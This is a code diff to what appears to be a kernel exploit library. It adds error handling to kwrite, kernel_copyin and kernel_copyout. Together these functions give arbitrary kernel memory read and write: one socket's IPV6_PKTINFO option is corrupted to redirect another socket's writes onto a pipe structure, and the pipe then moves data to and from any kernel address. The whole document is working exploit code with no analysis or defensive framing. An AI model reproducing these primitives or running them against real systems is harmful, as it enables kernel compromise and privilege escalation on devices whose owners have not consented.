@@ -28,19 +28,24 @@ void kernel_init_rw(int master_sock, int victim_sock, int *rw_pipe, uint64_t pip
 }
 
 // Internal kwrite function - not friendly, only for setting up better primitives.
-void kwrite(uint64_t addr, uint64_t *data) {
+int kwrite(uint64_t addr, uint64_t *data) {
 	uint64_t victim_buf[3];
 
 	victim_buf[0] = addr;
 	victim_buf[1] = 0;
 	victim_buf[2] = 0;
 
-	setsockopt(_master_sock, IPPROTO_IPV6, IPV6_PKTINFO, victim_buf, 0x14);
-	setsockopt(_victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, data, 0x14);
+	if(setsockopt(_master_sock, IPPROTO_IPV6, IPV6_PKTINFO, victim_buf, 0x14)) {
+		return -1;
+	}
+	if(setsockopt(_victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, data, 0x14)) {
+		return -1;
+	}
+	return 0;
 }
 
 // Public API function to write kernel data.
-void kernel_copyin(void *src, uint64_t kdest, size_t length)
+int kernel_copyin(void *src, uint64_t kdest, size_t length)
 {
 	uint64_t write_buf[3];
 
@@ -48,20 +53,27 @@ void kernel_copyin(void *src, uint64_t kdest, size_t length)
 	write_buf[0] = 0;
 	write_buf[1] = 0x4000000000000000;
 	write_buf[2] = 0;
-	kwrite(_pipe_addr, (uint64_t *) &write_buf);
+	if(kwrite(_pipe_addr, (uint64_t *) &write_buf)) {
+		return -1;
+	}
 
 	// Set pipe data addr
 	write_buf[0] = kdest;
 	write_buf[1] = 0;
 	write_buf[2] = 0;
-	kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf);
+	if(kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf)) {
+		return -1;
+	}
 
 	// Perform write across pipe
-	_write(_rw_pipe[1], src, length);
+	if(_write(_rw_pipe[1], src, length) < 0) {
+		return -1;
+	}
+	return 0;
 }
 
 // Public API function to read kernel data.
-void kernel_copyout(uint64_t ksrc, void *dest, size_t length)
+int kernel_copyout(uint64_t ksrc, void *dest, size_t length)
 {
 	uint64_t write_buf[3];
 
@@ -69,14 +81,21 @@ void kernel_copyout(uint64_t ksrc, void *dest, size_t length)
 	write_buf[0] = 0x4000000040000000;
 	write_buf[1] = 0x4000000000000000;
 	write_buf[2] = 0;
-	kwrite(_pipe_addr, (uint64_t *) &write_buf);
+	if(kwrite(_pipe_addr, (uint64_t *) &write_buf)) {
+		return -1;
+	}
 
 	// Set pipe data addr
 	write_buf[0] = ksrc;
 	write_buf[1] = 0;
 	write_buf[2] = 0;
-	kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf);
+	if(kwrite(_pipe_addr + 0x10, (uint64_t *) &write_buf)) {
+		return -1;
+	}
 
 	// Perform read across pipe
-	_read(_rw_pipe[0], dest, length);
+	if(_read(_rw_pipe[0], dest, length) < 0) {
+		return -1;
+	}
+	return 0;
 }
